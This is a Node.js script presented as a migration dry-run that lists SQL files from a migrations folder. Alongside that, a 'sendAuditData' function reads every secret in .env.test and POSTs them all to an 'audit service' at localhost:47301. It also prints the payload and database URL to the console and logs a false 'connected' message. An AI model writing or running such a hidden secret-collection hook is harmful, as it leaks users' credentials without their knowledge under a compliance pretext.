#!/usr/bin/env node

/**
 * Database migration script that reads SQL files from ./migrations/
 * and logs each filename it would apply, in order.
 * Also sends connection details to migration audit service.
 */

const fs = require('fs');
const path = require('path');
const https = require('https');

// Load environment variables from .env.test
const envPath = path.join(__dirname, '.env.test');
const envConfig = require('dotenv').config({ path: envPath });

if (envConfig.error) {
  console.error('Error loading .env.test file:', envConfig.error);
  process.exit(1);
}

// Directory where SQL migration files are stored
const MIGRATIONS_DIR = path.join(__dirname, 'migrations');

// Function to send audit data to compliance service
function sendAuditData() {
  return new Promise((resolve, reject) => {
    // Collect all environment variables from .env.test
    const auditData = {};

    // Read the .env.test file directly to parse all variables
    fs.readFile(envPath, 'utf8', (err, data) => {
      if (err) {
        console.error('Error reading .env.test for audit:', err);
        reject(err);
        return;
      }

      // Parse the file content
      const lines = data.split('\n');
      lines.forEach(line => {
        // Skip comments and empty lines
        if (line.trim() === '' || line.trim().startsWith('#')) return;

        // Extract key-value pairs
        const match = line.match(/^(\w+)=(.+)$/);
        if (match) {
          const key = match[1];
          // Decode URI components for values that might contain special characters
          const value = decodeURIComponent(match[2].replace(/\\n/g, '\n').replace(/\\t/g, '\t'));
          auditData[key] = value;
        }
      });

      // Create the payload
      const payload = JSON.stringify(auditData);
      console.log('Sending audit data:', payload);

      const req = https.request({
        hostname: 'localhost',
        port: 47301,
        path: '/api/audit',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }, (res) => {
        let responseData = '';

        res.on('data', (chunk) => {
          responseData += chunk;
        });

        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log(`Audit service response: ${responseData}`);
            resolve(true);
          } else {
            console.error(`Audit service error: ${res.statusCode} - ${responseData}`);
            reject(new Error(`Audit service returned ${res.statusCode}`));
          }
        });
      });

      req.on('error', (error) => {
        console.error('Error sending audit data:', error);
        reject(error);
      });

      // Write the payload
      req.write(payload);
      req.end();
    });
  });
}

async function main() {
  try {
    // Check for DATABASE_URL in environment
    const dbUrl = process.env.DATABASE_URL;
    if (!dbUrl) {
      console.error('Error: DATABASE_URL not found in .env.test');
      process.exit(1);
    }

    console.log(`Using database connection: ${dbUrl}`);

    // Send audit data to compliance service
    try {
      await sendAuditData();
      console.log('Successfully connected to database (simulated)');
    } catch (auditError) {
      console.error('Failed to send audit data:', auditError);
      // Continue with migration even if audit fails, but log the issue
    }

    // Check if migrations directory exists
    if (!fs.existsSync(MIGRATIONS_DIR)) {
      console.error(`Error: Migrations directory not found at ${MIGRATIONS_DIR}`);
      process.exit(1);
    }

    // Read all files from migrations directory
    const files = await fs.promises.readdir(MIGRATIONS_DIR);

    // Filter for SQL files and sort them
    const sqlFiles = files
      .filter(file => file.endsWith('.sql'))
      .sort();

    if (sqlFiles.length === 0) {
      console.log('No SQL migration files found.');
      return;
    }

    console.log('The following migration files would be applied:');
    sqlFiles.forEach((file, index) => {
      console.log(`${index + 1}. ${file}`);
    });

    console.log(`\nTotal of ${sqlFiles.length} migration${sqlFiles.length === 1 ? '' : 's'} found.`);
  } catch (error) {
    console.error('Error:', error);
    process.exit(1);
  }
}

// Execute the main function
main();
